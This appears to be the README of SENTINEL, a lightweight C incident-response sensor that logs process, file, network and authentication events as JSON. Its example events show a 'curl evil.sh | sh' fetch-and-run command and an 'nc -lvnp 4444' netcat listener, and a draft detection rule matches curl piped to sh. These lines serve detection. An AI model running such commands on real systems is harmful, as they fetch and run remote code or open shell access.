# SENTINEL 🛰️

*A lightweight incident response sensor for Linux systems, containers, and lab environments.*

SENTINEL is a small C-based host telemetry daemon designed for rapid deployment during incident response, threat hunting, security monitoring, and infrastructure assessments.

The goal is simple:

> Detect interesting activity, preserve context, and emit structured telemetry that can be consumed by any logging or security platform.

Unlike large endpoint detection and response (EDR) platforms, SENTINEL focuses on minimal dependencies, low resource consumption, and straightforward deployment.

---

## Features

### Process Monitoring

Detects newly observed processes and records execution metadata.

Example:

```json
{
  "event": "process_exec",
  "pid": 1337,
  "ppid": 1,
  "user": "root",
  "cmd": "/bin/bash -c curl evil.sh | sh",
  "time": "2026-06-20T19:10:00Z"
}
```

### File Integrity Monitoring

Monitors sensitive system files for changes using Linux inotify.

Examples:

* `/etc/passwd`
* `/etc/shadow`
* `/etc/group`
* `/etc/sudoers`
* `/etc/ssh/sshd_config`

### Network Visibility

Tracks:

* New listening ports
* Service exposure changes
* TCP listener state changes

### Authentication Monitoring

Watches for indicators associated with:

* SSH activity
* Account modifications
* Privilege escalation changes

### Structured JSON Output

All telemetry is emitted as JSON to standard output.

This enables direct integration with:

* Splunk
* Security Onion
* Wazuh
* Loki
* ELK Stack
* Fluent Bit
* Syslog pipelines
* Custom webhooks

---

## Architecture

```text
                ┌─────────────────┐
                │  SENTINEL    │
                └────────┬────────┘
                         │
         ┌───────────────┼───────────────┐
         │               │               │
         ▼               ▼               ▼

   /proc Scanner   Inotify Watcher   Network Monitor

         │               │               │
         └─────── JSON Event Stream ─────┘
                         │
                         ▼

                   stdout
                         │
         ┌───────────────┼───────────────┐
         ▼               ▼               ▼

       Loki          Splunk          Wazuh
```

---

## Building

### Requirements

* GCC or Clang
* GNU Make
* Linux kernel with inotify support

### Compile

```bash
make
```

Output:

```bash
./ir-sentinel
```

### Run

```bash
./ir-sentinel
```

---

## Container Deployment

### Docker

Build:

```bash
docker build -t ir-sentinel .
```

Run:

```bash
docker run \
  --rm \
  --pid=host \
  --network=host \
  --read-only \
  ir-sentinel
```

### Docker Compose

```yaml
services:
  ir-sentinel:
    image: ghcr.io/bobbymayyy/ir-sentinel:latest
    container_name: ir-sentinel

    pid: host
    network_mode: host

    read_only: true

    cap_add:
      - SYS_PTRACE
      - DAC_READ_SEARCH

    volumes:
      - /proc:/host/proc:ro
      - /etc:/host/etc:ro
      - /var/log:/host/var/log:ro

    restart: unless-stopped
```

---

## Example Output

### Process Execution

```json
{
  "event": "process_exec",
  "pid": 4123,
  "user": "root",
  "cmd": "nc -lvnp 4444",
  "time": "2026-06-20T19:10:00Z"
}
```

### File Change

```json
{
  "event": "file_modified",
  "path": "/etc/sudoers",
  "time": "2026-06-20T19:11:42Z"
}
```

### New Listening Port

```json
{
  "event": "new_listener",
  "port": 4444,
  "protocol": "tcp",
  "time": "2026-06-20T19:12:04Z"
}
```

---

## Roadmap

### Phase 1

* [x] Process discovery
* [x] File monitoring
* [x] Listening port detection
* [x] JSON logging
* [x] Container deployment

### Phase 2

* [ ] Netlink process events
* [ ] Netlink socket events
* [ ] Configurable watch paths
* [ ] YAML configuration
* [ ] Event filtering

### Phase 3

* [ ] Rule engine
* [ ] Detection signatures
* [ ] Alert enrichment
* [ ] Process tree reconstruction
* [ ] Evidence preservation

### Phase 4

* [ ] Distributed deployment
* [ ] Webhook integrations
* [ ] SIEM-specific outputs
* [ ] Ansible deployment role
* [ ] DIP / DIPx integration

---

## Detection Rules (Future)

Example:

```yaml
rules:

  - name: suspicious_curl_pipe_shell

    match:
      cmd_contains:
        - curl
        - "| sh"

    actions:
      - log
      - webhook
      - snapshot_proc_tree
```

Potential response actions:

* Log
* Webhook
* Process tree capture
* Network connection snapshot
* Open file collection
* Memory acquisition trigger
* Artifact preservation

---

## CI/CD

GitHub Actions pipeline:

```text
Push
 │
 ▼

Build
 │
 ▼

Unit Tests
 │
 ▼

clang-tidy
 │
 ▼

cppcheck
 │
 ▼

Container Build
 │
 ▼

Image Scan
 │
 ▼

GHCR Publish
 │
 ▼

Release Artifacts
```

Release outputs:

* ir-sentinel-linux-amd64
* ir-sentinel-linux-arm64
* ir-sentinel.tar.gz
* Container Image
* SBOM
* checksums.txt

---

## Project Goals

SENTINEL is intended to provide:

* Rapid incident response deployment
* Lightweight host visibility
* Low operational overhead
* Infrastructure triage capabilities
* Portable telemetry collection
* Seamless integration into the broader DIP/DIPx ecosystem

The long-term vision is to evolve SENTINEL from a simple sensor into a deployable evidence collection and incident response platform capable of:

**Detect → Snapshot → Preserve → Enrich → Alert**
